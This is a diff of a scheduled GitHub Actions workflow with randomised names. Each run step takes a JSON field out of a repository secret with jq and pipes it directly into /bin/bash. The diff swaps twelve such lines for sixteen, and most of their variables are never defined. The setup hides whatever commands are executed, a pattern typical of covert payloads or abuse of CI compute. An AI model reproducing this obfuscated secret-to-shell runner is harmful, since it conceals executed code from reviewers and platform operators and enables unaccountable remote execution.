@@ -3,27 +3,31 @@ name: xupingzhi4321
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 4/6 * * *'
-
+    - cron: '26 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xupingzhi4321
         env:
-          j381: ${{ secrets.j381 }}
+          xnqcr228: ${{ secrets.xnqcr228 }}
         run: |
-          echo $j381 | jq -r .x1714 | /bin/bash
-          echo $vcei453 | jq -r .e997 | /bin/bash
-          echo $hvsbc22499 | jq -r .ecxz249 | /bin/bash
-          echo $twmz13 | jq -r .x798 | /bin/bash
-          echo $vk200 | jq -r .uq637 | /bin/bash
-          echo $bsqxj81 | jq -r .k47 | /bin/bash
-          echo $wxjos16511 | jq -r .cxd1 | /bin/bash
-          echo $xun95933 | jq -r .zpzn35 | /bin/bash
-          echo $bs5 | jq -r .qgid2 | /bin/bash
-          echo $miesr0 | jq -r .r8122 | /bin/bash
-          echo $cgvpj671 | jq -r .gyhh0 | /bin/bash
-          echo $ci4 | jq -r .d9775 | /bin/bash
+          echo $xnqcr228 | jq -r .xflpi3 | /bin/bash
+          echo $dcic5 | jq -r .aq603 | /bin/bash
+          echo $iyryv64653 | jq -r .kl611 | /bin/bash
+          echo $apqgy5 | jq -r .tuoml3632 | /bin/bash
+          echo $kc78282 | jq -r .cwjtj4 | /bin/bash
+          echo $m0881 | jq -r .bvs49 | /bin/bash
+          echo $gfiwp2472 | jq -r .reg665 | /bin/bash
+          echo $nuo2067 | jq -r .o64 | /bin/bash
+          echo $pex23 | jq -r .pon2835 | /bin/bash
+          echo $qlthf72 | jq -r .e8751 | /bin/bash
+          echo $ng6105 | jq -r .yoj1244 | /bin/bash
+          echo $tyf2 | jq -r .sc21600 | /bin/bash
+          echo $bjx448 | jq -r .an1357 | /bin/bash
+          echo $nm0991 | jq -r .tdke62702 | /bin/bash
+          echo $ggx0 | jq -r .vqj88022 | /bin/bash
+          echo $cxk7 | jq -r .kvwq7 | /bin/bash
 
